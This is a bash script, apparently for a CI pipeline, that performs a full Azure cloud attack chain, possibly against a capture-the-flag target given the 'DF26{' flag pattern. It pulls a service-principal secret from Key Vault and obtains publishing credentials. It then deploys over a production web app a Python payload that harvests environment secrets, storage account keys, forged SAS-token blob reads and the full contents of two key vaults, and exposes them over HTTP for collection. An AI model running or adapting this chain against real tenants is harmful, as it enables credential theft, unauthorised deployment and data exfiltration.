#!/usr/bin/env bash
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
SCM="https://$APPR.scm.azurewebsites.net"; APPURL="https://$APPR.azurewebsites.net"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
KVP=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
RS=$(curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
RA=$(echo "$RS"|jq -r .appId); RK=$(echo "$RS"|jq -r .clientSecret)
MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$RA" -d grant_type=client_credentials -d "client_secret=$RK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/publishingcredentials/list?api-version=2023-12-01" > /tmp/pc.json
U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')
# build deploy package in CI runner
mkdir -p /tmp/dep && cd /tmp/dep
cat > application.py <<'PYEOF'
import os,json,urllib.request,urllib.parse,base64,hmac,hashlib,re
CID="7a85156a-01c4-4e61-8472-40a92107159b"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6";RG="rg-tbl-platform-prod-sea";ACC="sttblappcfgprodx3euoz"
def tok(res):
    ie=os.environ.get("IDENTITY_ENDPOINT","");ih=os.environ.get("IDENTITY_HEADER","")
    if not ie or not ih: return "ERR:no-ie"
    u=ie+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+CID
    try: return json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih}),timeout=20).read()).get("access_token","")
    except Exception as e:
        try: return "ERR:"+e.read().decode()[:200]
        except: return "ERR:"+str(e)[:200]
def req(u,h,method="GET"):
    try: return urllib.request.urlopen(urllib.request.Request(u,headers=h,method=method),timeout=20).read().decode("utf-8","replace")
    except Exception as e:
        try: return "ERR%s:%s"%(getattr(e,'code','?'),e.read().decode("utf-8","replace")[:300])
        except: return "ERR:"+str(e)[:200]
def run():
    O={"ie":bool(os.environ.get("IDENTITY_ENDPOINT")),"env_df":[(k,v) for k,v in os.environ.items() if "DF26{" in str(v)]}
    for k,v in os.environ.items():
        if any(x in k.upper() for x in ("CONFIG","STORAGE","CONN","SECRET","VAULT","ACCOUNTKEY")): O.setdefault("env_hits",[]).append(k+"="+str(v)[:160])
    st=tok("https://storage.azure.com/");O["st"]=st[:10]
    if st and not st.startswith("ERR"):
        O["blob_direct"]=req("https://%s.blob.core.windows.net/config/internal-config.json"%ACC,{"Authorization":"Bearer "+st,"x-ms-version":"2021-08-06"})[:1200]
    mg=tok("https://management.azure.com/");O["mg"]=mg[:10]
    if mg and not mg.startswith("ERR"):
        kr=req("https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-05-01"%(SUB,RG,ACC),{"Authorization":"Bearer "+mg,"Content-Length":"0"},"POST")
        try:
            key=json.loads(kr)["keys"][0]["value"]
            sv="2021-08-06";sts="\n".join([ACC,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
            sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
            sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
            O["cfg_blobs"]=re.findall(r"<Name>([^<]+)</Name>",req("https://%s.blob.core.windows.net/config?restype=container&comp=list&%s"%(ACC,sas),{}))
            O["internal_config"]=req("https://%s.blob.core.windows.net/config/internal-config.json?%s"%(ACC,sas),{})[:1200]
        except Exception: O["listkeys"]=kr[:200]
    vt=tok("https://vault.azure.net/");O["vt"]=vt[:10]
    if vt and not vt.startswith("ERR"):
        for kv in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
            d=req("https://%s.vault.azure.net/secrets?api-version=7.4"%kv,{"Authorization":"Bearer "+vt})
            try:
                ids=[s["id"] for s in json.loads(d).get("value",[])];O[kv]=ids
                for i in ids: O[kv+"::"+i.split("/")[-1]]=req(i+"?api-version=7.4",{"Authorization":"Bearer "+vt})[:400]
            except Exception: O[kv]=d[:150]
    return O
try:
    RESULT=run()
    open("/home/site/wwwroot/zzcl_out.json","w").write(json.dumps(RESULT))
except Exception as e:
    RESULT={"err":str(e)}
def app(environ,start_response):
    b=("TBLRESULT="+json.dumps(RESULT)).encode()
    start_response("200 OK",[("Content-Type","text/plain"),("Content-Length",str(len(b)))])
    return [b]
PYEOF
cp application.py app.py; printf '' > requirements.txt
zip -q -r /tmp/dep.zip application.py app.py requirements.txt
echo "zip bytes: $(wc -c < /tmp/dep.zip)"
echo "### zipdeploy"
curl -s -m 180 -o /tmp/zd.txt -w 'zipdeploy -> %{http_code}\n' -X POST --data-binary @/tmp/dep.zip -H "Content-Type: application/zip" -H "Authorization: Basic $BA" "$SCM/api/zipdeploy?isAsync=false"
head -c 300 /tmp/zd.txt; echo
echo "### wait for restart + curl app"
for i in $(seq 1 20); do
  sleep 8
  R=$(curl -s -m 30 "$APPURL/")
  echo "$R" | grep -aoE 'TBLRESULT=.*' >/tmp/r.txt && { echo "got response try $i"; break; }
done
echo "=== APP RESPONSE ==="; cat /tmp/r.txt 2>/dev/null | head -c 3000; echo
echo "### fallback: read zzcl_out.json via VFS"
curl -s -H "Authorization: Basic $BA" "$SCM/api/vfs/site/wwwroot/zzcl_out.json" | head -c 3000; echo
echo "=== DONE ==="
